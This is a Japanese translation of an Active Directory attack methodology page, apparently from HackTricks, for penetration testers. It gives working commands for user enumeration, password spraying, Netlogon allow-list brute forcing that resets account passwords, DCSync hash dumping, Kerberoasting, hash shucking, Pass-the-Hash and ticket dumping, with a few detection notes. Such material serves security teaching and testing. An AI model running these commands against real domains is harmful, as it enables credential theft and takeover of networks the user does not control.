# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤となるテクノロジーとして機能し、**ネットワーク管理者**がネットワーク内の**ドメイン**、**ユーザー**、**オブジェクト**を効率的に作成・管理できるようにします。拡張性を考慮して設計されており、多数のユーザーを管理しやすい**グループ**や**サブグループ**に整理しながら、さまざまなレベルで**アクセス権**を制御できます。

**Active Directory** の構造は、主に **ドメイン**、**ツリー**、**フォレスト**の3つの層で構成されます。**ドメイン**は、共通のデータベースを共有する**ユーザー**や**デバイス**などのオブジェクトの集合です。**ツリー**は、共通の構造によってリンクされたこれらのドメインのグループであり、**フォレスト**は、**信頼関係**によって相互接続された複数のツリーの集合で、組織構造の最上位層を形成します。これら各レベルで、特定の**アクセス**権や**通信権**を指定できます。

**Active Directory** の主な概念は次のとおりです。

1. **Directory** – Active Directory オブジェクトに関するすべての情報を格納します。
2. **Object** – **ユーザー**、**グループ**、**共有フォルダー**など、ディレクトリ内のエンティティを指します。
3. **Domain** – ディレクトリオブジェクトのコンテナとして機能します。1つの**フォレスト**内に複数のドメインを共存させることができ、それぞれが独自のオブジェクト集合を保持します。
4. **Tree** – 共通のルートドメインを共有するドメインのグループです。
5. **Forest** – Active Directory の組織構造の頂点であり、複数のツリーで構成され、それらの間に**信頼関係**があります。

**Active Directory Domain Services (AD DS)** は、ネットワーク内の集中管理と通信に不可欠なさまざまなサービスを含みます。これらのサービスは次のとおりです。

1. **Domain Services** – データの保存を一元化し、**認証**や**検索**機能を含む、**ユーザー**と**ドメイン**間のやり取りを管理します。
2. **Certificate Services** – 安全な**デジタル証明書**の作成、配布、管理を監督します。
3. **Lightweight Directory Services** – **LDAP プロトコル**を通じて、ディレクトリ対応アプリケーションをサポートします。
4. **Directory Federation Services** – **シングルサインオン**機能を提供し、1回のセッションで複数の Web アプリケーションに対してユーザーを認証できるようにします。
5. **Rights Management** – 著作権で保護されたコンテンツの不正な配布や使用を規制し、その保護を支援します。
6. **DNS Service** – **ドメイン名**の解決に不可欠です。

より詳細な説明については、[**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory) を確認してください。

### **Kerberos Authentication**

**AD を攻撃する**方法を学ぶには、**Kerberos 認証プロセス**を本当にしっかりと**理解する**必要があります。\
[**まだ仕組みを知らない場合は、このページを読んでください。**](kerberos-authentication.md)

## チートシート

AD で実行できるコマンドをすばやく確認するには、[https://wadcoms.github.io/](https://wadcoms.github.io) を利用できます。

> [!WARNING]
> Kerberos 通信では、アクションの実行に**完全修飾名 (FQDN)** が必要です。IP アドレスでマシンにアクセスしようとすると、**Kerberos ではなく NTLM が使用されます**。

## Active Directory の Recon（認証情報/セッションなし）

AD 環境にアクセスできるものの、認証情報やセッションを持っていない場合は、次のことができます。

- **ネットワークを Pentest する:**
- ネットワークをスキャンし、マシンと開いているポートを見つけ、**脆弱性を exploit** するか、そこから**認証情報を抽出**します（たとえば、[プリンターは非常に興味深いターゲットになる可能性があります](ad-information-in-printers.md)）。
- DNS を列挙すると、Web、プリンター、共有、VPN、メディアなど、ドメイン内の重要なサーバーに関する情報が得られる可能性があります。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- これを実行する方法の詳細については、一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を確認してください。
- **SMB サービスで null および Guest アクセスを確認する**（これは最新の Windows バージョンでは機能しません）。
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB サーバーを列挙する方法の詳細なガイドはこちらにあります。


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap を列挙する**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP を列挙する方法の詳細なガイドはこちらにあります（**匿名アクセス**には特に注意してください）。


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **ネットワークを Poison する**
- [**Responder を使用してサービスになりすます**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ことで認証情報を収集する
- [**relay attack を悪用する**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)ことでホストにアクセスする
- [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) を使用して**偽の UPnP サービスを公開**し、認証情報を収集する
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 内部文書、ソーシャルメディア、ドメイン環境内のサービス（主に Web）、および公開されている情報から、ユーザー名/氏名を抽出する。
- 会社従業員の完全な氏名がわかった場合は、さまざまな AD の**ユーザー名規則 (**[**こちらを読む**](https://activedirectorypro.com/active-directory-user-naming-convention/)) を試すことができます。最も一般的な規則は、_NameSurname_、_Name.Surname_、_NamSur_（それぞれ3文字）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、_ランダムな3文字とランダムな3つの数字_（abc123）です。
- ツール:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### ユーザー列挙

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) および [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) のページを確認してください。
- **Kerbrute enum**: **無効なユーザー名が要求された場合**、サーバーは **Kerberos エラー**コード _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ を使用して応答するため、ユーザー名が無効であると判断できます。**有効なユーザー名**の場合、**AS-REP** 応答内の **TGT**、またはエラー _KRB5KDC_ERR_PREAUTH_REQUIRED_ のいずれかが返されます。後者は、そのユーザーが事前認証を実行する必要があることを示します。
- **MS-NRPC に対する認証なし**: ドメインコントローラー上の MS-NRPC (Netlogon) インターフェイスに対して、auth-level = 1（認証なし）を使用します。この手法では、MS-NRPC インターフェイスに bind した後、`DsrGetDcNameEx2` 関数を呼び出し、認証情報なしでユーザーまたはコンピューターが存在するかを確認します。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) ツールは、この種類の列挙を実装しています。調査結果は[こちら](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>で確認できます。
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

ネットワーク内でこのようなサーバーを発見した場合、**user enumeration** も実行できます。たとえば、次のツール [**MailSniper**](https://github.com/dafthack/MailSniper) を使用できます。
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> ユーザー名のリストは[**このgithub repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)およびこちら（[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)）で確認できます。
>
> ただし、この前に実施したrecon stepで、**会社で働いている人々の名前**を把握しておくべきです。名前と姓が分かれば、スクリプト[**namemash.py**](https://gist.github.com/superkojiman/11076951)を使用して、有効な可能性のあるユーザー名を生成できます。

### Netlogonの脆弱なチャネルのallow-list悪用（Onelogon）

DCに**Zerologon**のpatchを適用した後でも、明示的にallow-listされたアカウントは、**legacy/vulnerable Netlogon secure-channel behavior**にさらされる可能性があります。リスクのある設定は、GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`**、または対応するレジストリ値 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**です。

この値は**SDDL security descriptor**です（[Security Descriptors](security-descriptors.md)を参照）。DACLで関連するACEを付与されたアカウントまたはグループは、targetにできます。例えば、`O:BAG:BAD:(A;;RC;;;WD)`は実質的に**Everyone**をallow-listします。

実際のoperator workflow：

1. **SYSVOL/GPO**と**live DC registry**の両方を確認し、allow-listされたprincipalを特定する。
2. SDDL内の**SID**を実際のADユーザーまたはコンピューターにresolveし、**DC machine accounts**、**trust accounts**、その他のprivileged machinesを優先する。
3. allow-listされたアカウントとして、**MS-NRPC / Netlogon authentication**を繰り返し試行する。
4. 推測に成功した後、**Netlogon password-setting**を悪用してtargetアカウントのパスワードをresetする（public PoCでは空文字列に設定されます）。<sup>[[9]](#references)[[10]](#references)</sup>

public artifactにある簡単なtriage / lab examples：
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- **scanner** が有用なのは、実効的な allow-list が **SYSVOL**、**registry**、またはその両方に存在する可能性があるためです。
- exploit path 自体が重要なのは、脆弱なアカウントを特定できれば、**Domain Admin privileges** を必要としないためです。
- `DC$` のような **Domain Controller machine account** を侵害することは特に危険です。このパスワードをリセットすると、より広範な **AD takeover** paths を直接有効化できるためです。
- **Brute-force feasibility** は mode に依存します。公開 artifact では、meet-in-the-middle approach、別の computer account が利用可能な場合の **24-bit** brute force、さらに低速な **32-bit** variants が説明されています。

Detection / hardening notes:

- allow-list policy を監査し、一時的かつ明示的に必要な compatibility exceptions 以外はすべて削除してください。
- DC **System** events **5827/5828/5829/5830/5831** を監視し、脆弱な Netlogon connections が拒否された場合、発見された場合、または policy により明示的に許可された場合を検知してください。
- `VulnerableChannelAllowList` 内の accounts は、legacy dependency が削除されるまで **high-risk** として扱ってください。

### 1つまたは複数の username を知っている場合

すでに有効な username は分かっているものの、password がない場合は、次を試してください。

- [**ASREPRoast**](asreproast.md): ユーザーに _DONT_REQ_PREAUTH_ attribute が**ない**場合、そのユーザーに対して **AS_REP message** を **request** できます。この message には、ユーザーの password から導出された値で encrypted されたデータが含まれます。
- [**Password Spraying**](password-spraying.md): 発見した各 user に対して、最も **common passwords** を試します。password の弱い user がいるかもしれません（password policy に注意してください！）。
- **OWA servers** に対しても spray を実行し、ユーザーの mail servers への access を試みられることに注意してください。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**Poisoning** によって、**network** 上の一部 protocol の challenge **hashes** を **obtain** できる場合があります。


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

active directory の enumerate に成功していれば、**more emails and a better understanding of the network** を得られます。NTLM を強制的に [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) して、AD env への access を得られる可能性があります。

### NetExec workspace-driven recon & relay posture checks

- **`nxcdb` workspaces** を使用して、engagement ごとに AD recon state を保持します。`workspace create <name>` は `~/.nxc/workspaces/<name>` 配下に protocol ごとの SQLite DBs（smb/mssql/winrm/ldap/etc）を生成します。`proto smb|mssql|winrm` で views を切り替え、`creds` で収集した secrets を一覧表示します。終了後は sensitive data を手動で purge してください：`rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** による quick subnet discovery では、**domain**、**OS build**、**SMB signing requirements**、**Null Auth** が表示されます。(signing:False) と表示される members は **relay-prone** ですが、DCs では signing が要求されることが多くあります。
- targeting を容易にするため、NetExec output から **hostnames in /etc/hosts** を直接生成します：
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC is blocked** by signing, それでも **LDAP** の状態を確認する: `netexec ldap <dc>` は `(signing:None)` / 弱い channel binding を強調表示する。SMB signing が必須でも LDAP signing が無効な DC は、**SPN-less RBCD** などの悪用による **relay-to-LDAP** の有効なターゲットであり続ける。

### クライアント側のプリンター credential leaks → ドメイン credential の一括検証

- プリンターや Web UI に **マスクされた管理者パスワードが HTML に埋め込まれている**ことがある。ソースや devtools を確認すると、平文（例: `<input value="<password>">`）が判明し、Basic-auth によるスキャン/印刷リポジトリへのアクセスが可能になる場合がある。
- 取得した印刷ジョブには、ユーザーごとのパスワードが記載された **平文のオンボーディング文書**が含まれていることがある。テスト時は対応関係を維持する:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

**null または guest user**で**他の PC や share にアクセス**できる場合、**ファイル**（SCF file など）を**配置**し、それが何らかの方法でアクセスされると、あなたに対する**NTLM authentication を trigger**させることができます。これにより、**NTLM challenge を steal**して crack できます:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**は、すでに所持しているすべての NT hash を、key material が NT hash から直接導出される、より低速な別形式の候補 password として扱います。Kerberos RC4 tickets、NetNTLM challenges、cached credentials で長い passphrase を brute-force する代わりに、NT hash を Hashcat の NT-candidate modes に渡し、plaintext を知ることなく password reuse を検証させます。これは、domain compromise 後に大量の現在および過去の NT hash を収集できる場合に特に強力です。<sup>[[5]](#references)</sup>

次のような場合に shucking を使用します:

- DCSync、SAM/SECURITY dumps、または credential vaults から NT corpus を取得しており、他の domains/forests で reuse されているか確認する必要がある場合。
- RC4-based Kerberos material（`$krb5tgs$23$`, `$krb5asrep$23$`）、NetNTLM responses、または DCC/DCC2 blobs を capture した場合。
- crack できない長い passphrase の reuse を迅速に証明し、Pass-the-Hash 経由ですぐに pivot したい場合。

この technique は、key が NT hash ではない encryption types（Kerberos etype 17/18 AES など）には**機能しません**。domain が AES-only を強制している場合は、通常の password modes に戻す必要があります。

#### NT hash corpus の構築

- **DCSync/NTDS** – `secretsdump.py` を history オプション付きで使用し、可能な限り多くの NT hash（過去の値を含む）を取得します:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries によって candidate pool は大幅に広がります。これは Microsoft が account ごとに最大 24 個の過去の hash を保存できるためです。NTDS secrets を harvest するその他の方法については、次を参照してください:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（または Mimikatz の `lsadump::sam /patch`）により、local SAM/SECURITY data と cached domain logons（DCC/DCC2）を extract します。重複を削除し、それらの hash を同じ `nt_candidates.txt` list に追加します。
- **Track metadata** – 各 hash を生成した username/domain を記録しておきます（wordlist に hex だけが含まれている場合でも同様です）。Hashcat が winning candidate を出力した際、matching hashes により、どの principal が password を reuse しているかをすぐに特定できます。
- 同じ forest または trusted forest の candidates を優先します。これにより、shucking で overlap が発生する可能性を最大化できます。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意:

- NT-candidate inputs は**raw 32-hex NT hashes のままにする必要があります**。rule engines を無効にします（`-r` は使用せず、hybrid modes も使用しません）。mangling によって candidate key material が破損するためです。
- これらの modes は本質的に高速というわけではありませんが、NTLM keyspace（M3 Max で約 30,000 MH/s）は Kerberos RC4（約 300 MH/s）より約 100 倍高速です。厳選した NT list を test する方が、低速な形式で password space 全体を探索するよりはるかに低コストです。
- 常に**最新の Hashcat build**（`git clone https://github.com/hashcat/hashcat && make install`）を実行してください。modes 31500/31600/35300/35400 は最近追加されたものです。<sup>[[7]](#references)</sup>
- 現在、AS-REQ Pre-Auth 用の NT mode は存在しません。また、AES etypes（19600/19700）では、key が raw NT hash ではなく UTF-16LE passwords から PBKDF2 によって導出されるため、plaintext password が必要です。

#### Example – Kerberoast RC4 (mode 35300)

1. low-privileged user を使用して target SPN の RC4 TGS を capture します（詳細は Kerberoast page を参照）:

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NT list を使用して ticket を shuck します:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat は各 NT candidate から RC4 key を導出し、`$krb5tgs$23$...` blob を検証します。match が確認されると、service account が既存の NT hash のいずれかを使用していることが分かります。

3. すぐに PtH 経由で pivot します:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

必要であれば、後から `hashcat -m 1000 <matched_hash> wordlists/` を使用して plaintext を復元できます。

#### Example – Cached credentials (mode 31600)

1. compromised workstation から cached logons を dump します:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 対象となる domain user の DCC2 line を `dcc2_highpriv.txt` に copy し、それを shuck します:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. match に成功すると、list にすでに存在する NT hash が得られ、cached user が password を reuse していることが証明されます。それを直接 PtH に使用する（`nxc smb <dc_ip> -u highpriv -H <hash>`）か、高速な NTLM mode で brute-force して string を復元します。

まったく同じ workflow を NetNTLM challenge-responses（`-m 27000/27100`）および DCC（`-m 31500`）にも適用できます。match が特定できたら、relay、SMB/WMI/WinRM PtH を開始するか、offline で masks/rules を使用して NT hash を再度 crack できます。



## credentials/session を使用した Active Directory の Enumeration

この phase では、**有効な domain account の credentials または session を compromise している必要があります**。有効な credentials または domain user としての shell がある場合、**前述の options も他の users を compromise するための手段として引き続き利用できる**ことを忘れないでください。

authenticated enumeration を開始する前に、**Kerberos double hop problem** が何であるかを理解しておく必要があります。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

account を compromise することは、**domain 全体の compromise を開始するための大きな一歩**です。これは、**Active Directory Enumeration** を開始できるようになるためです:

[**ASREPRoast**](asreproast.md) については、脆弱な可能性のあるすべての user を見つけられるようになります。また、[**Password Spraying**](password-spraying.md) については、**すべての usernames の list** を取得し、compromised account の password、empty passwords、新しく見つかった有望な passwords を試すことができます。

- [**CMD で basic recon を実行**](../basic-cmd-for-pentesters.md#domain-info)できます
- [**powershell を recon に使用**](../basic-powershell-for-pentesters/index.html)することもでき、こちらの方が stealthier です
- [**powerview を使用**](../basic-powershell-for-pentesters/powerview.md)して、より詳細な情報を extract することもできます
- Active directory における recon 用のもう 1 つの優れた tool は [**BloodHound**](bloodhound.md) です。これは**あまり stealthy ではありません**（使用する collection methods によって異なります）が、**それを気にしない**のであれば、ぜひ試してください。どの users が RDP できるか、他の groups への path などを見つけられます。
- **その他の automated AD enumeration tools:** [**AD Explorer**](bloodhound.md#ad-explorer)**、**[**ADRecon**](bloodhound.md#adrecon)**、**[**Group3r**](bloodhound.md#group3r)**、**[**PingCastle**](bloodhound.md#pingcastle)**。**
- **AD の [**DNS records**](ad-dns-records.md)**。興味深い情報が含まれている可能性があります。
- directory を enumerate するために使用できる **GUI tool** として、**SysInternal** Suite の **AdExplorer.exe** があります。
- **ldapsearch** を使用して LDAP database を検索し、_userPassword_ および _unixUserPassword_ fields、または _Description_ に credentials がないか探すこともできます。その他の methods については、PayloadsAllTheThings の [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) を参照してください。
- **Linux** を使用している場合は、[**pywerview**](https://github.com/the-useless-one/pywerview) を使用して domain を enumerate することもできます。
- 次のような automated tools も試せます:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **すべての domain users の Extracting**

Windows では、domain usernames をすべて取得するのは非常に簡単です（`net user /domain`、`Get-DomainUser`、または `wmic useraccount get name,sid`）。Linux では、次を使用できます: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` または `enum4linux -a -u "user" -p "password" <DC IP>`

> この Enumeration section は小さく見えるかもしれませんが、全体の中で最も重要な部分です。links（主に cmd、powershell、powerview、BloodHound のもの）にアクセスし、domain の enumerate 方法を学び、自信を持って実行できるまで practice してください。assessment では、ここが DA への path を見つける、または何もできないと判断するための重要な moment になります。

### Kerberoast

Kerberoasting では、user accounts に紐付いた services が使用する **TGS tickets** を取得し、user passwords に基づく encryption を**offline で crack**します。

詳細については、次を参照してください:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

credentials を取得したら、**machine** に access できるか確認できます。そのために、port scans に応じて、異なる protocols を使用して複数の servers への接続を **CrackMapExec** で試行できます。

### Local Privilege Escalation

通常の domain user として credentials または session を compromise しており、その user で domain 内の**いずれかの machine に access**できる場合、**local privilege escalation と credentials の looting** を試みるべきです。これは、local administrator privileges があって初めて、memory（LSASS）および local（SAM）から**他の users の hashes を dump**できるためです。

この book には [**Windows における local privilege escalation**](../windows-local-privilege-escalation/index.html) と [**checklist**](../checklist-windows-privilege-escalation.md) の完全な page があります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) の使用も忘れないでください。

### Current Session Tickets

現在の user の **tickets** に、予期しない resources への**access permission を与えるもの**が見つかる可能性は非常に**低い**ですが、次を確認できます:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Active Directory の列挙に成功していれば、**より多くのメールアドレスと、ネットワークについてのより深い理解を得られます**。NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** を強制できる可能性があります。**

### コンピューター共有 | SMB Shares で Creds を探す

基本的な認証情報を入手したので、**AD 内で共有されている** **興味深いファイルを見つけられるか**確認してください。手動でも実行できますが、とても退屈で反復的な作業です（確認が必要なドキュメントを何百個も見つけた場合は、なおさらです）。

[**使用できるツールについて学ぶには、このリンクを参照してください。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds を盗む

**他の PC や共有にアクセスできる**場合、（SCF ファイルなどの）**ファイルを配置**し、何らかの方法でアクセスされた際に**あなたに対する NTLM authentication をトリガー**させることで、**NTLM challenge**を**盗み**、これを crack できます。


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

この脆弱性により、認証済みユーザーであれば誰でも**ドメインコントローラーを侵害**できました。


{{#ref}}
printnightmare.md
{{#endref}}

## 特権付き認証情報/セッションを使用した Active Directory の Privilege escalation

**以下のテクニックでは、通常のドメインユーザーでは不十分であり、これらの攻撃を実行するには特別な権限/認証情報が必要です。**

### Hash extraction

[AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（relaying を含む）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[ローカルでの privilege escalation](../windows-local-privilege-escalation/index.html) を使用して、**local admin**アカウントを**侵害**できていることを願います。\
次に、メモリ上およびローカルにあるすべての hash を dump します。\
[**hash を取得するさまざまな方法については、このページを参照してください。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**ユーザーの hash を入手したら**、それを使ってユーザーになりすますことができます。\
その hash を**使用して NTLM authentication を実行する** **tool**を使う必要があります。あるいは、新しい **sessionlogon** を作成し、その hash を **LSASS** 内に**inject**することもできます。そうすれば、**NTLM authentication が実行されるたびに、その hash が使用されます。**最後の方法を実行するのが mimikatz です。\
[**詳細については、このページを参照してください。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

この攻撃は、一般的な NTLM protocol に対する Pass The Hash の代替として、**ユーザーの NTLM hash を使用して Kerberos tickets を要求する**ことを目的としています。そのため、**NTLM protocol が無効化され、authentication protocol として Kerberos のみが許可されているネットワーク**で特に**有用**です。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT) attack** では、攻撃者はパスワードや hash 値の代わりに**ユーザーの authentication ticket を盗みます**。この盗んだ ticket を使って**ユーザーになりすまし**、ネットワーク内のリソースやサービスへの不正アクセスを取得します。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

**local administrator**の**hash**または**password**を持っている場合は、それを使って他の**PC にローカル login**できるか試してください。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> これはかなり **noisy** であり、**LAPS** によって **mitigate** できる点に注意してください。

### MSSQL Abuse & Trusted Links

ユーザーが **MSSQL instances へのアクセス** 権限を持っている場合、MSSQL ホスト上で **commands を execute** できる可能性があります（SA として実行されている場合）。また、NetNTLM **hash** の **steal** や **relay** **attack** も実行できる可能性があります。\
また、ある MSSQL instance が別の MSSQL instance から信頼されている場合（database link）、ユーザーが信頼された database に対する権限を持っていれば、**trust relationship を利用して、もう一方の instance でも queries を execute** できるようになります。これらの trust は chain でき、最終的にユーザーは commands を execute できる misconfigured database を見つけられる可能性があります。\
**Databases 間の links は forest trusts をまたいでも機能します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party の inventory および deployment suites は、credentials や code execution につながる強力な経路をしばしば公開しています。以下を参照してください。

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性を持つ Computer object を発見し、その computer に対する domain privileges を持っている場合、その computer に login するすべての users の TGTs を memory から dump できるようになります。\
つまり、**Domain Admin がその computer に login すると**、その TGT を dump し、[Pass the Ticket](pass-the-ticket.md) を使用して impersonate できるようになります。\
constrained delegation により、**Print Server を自動的に compromise** することさえ可能です（そこが DC であることを願います）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

ユーザーまたは computer が "Constrained Delegation" を許可されている場合、**computer 上の一部の services にアクセスするため、任意の user を impersonate** できます。\
したがって、この user/computer の **hash を compromise** できれば、**一部の services にアクセスするために任意の user**（domain admins を含む）を **impersonate** できるようになります。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

remote computer の Active Directory object に対する **WRITE** privilege を持つと、**elevated privileges** で code execution を実現できます。


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

compromised user は、**一部の domain objects に対する興味深い privileges** を持っている可能性があり、それによって laterally **move** したり privileges を **escalate** したりできます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

domain 内で **Spool service が listening している** ことを発見した場合、それを **abuse** して **新しい credentials を acquire** し、**privileges を escalate** できます。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**他の users** が **compromised** machine に **access** する場合、memory から **credentials を gather** し、さらにその users を impersonate するために、彼らの processes に beacons を **inject** することも可能です。\
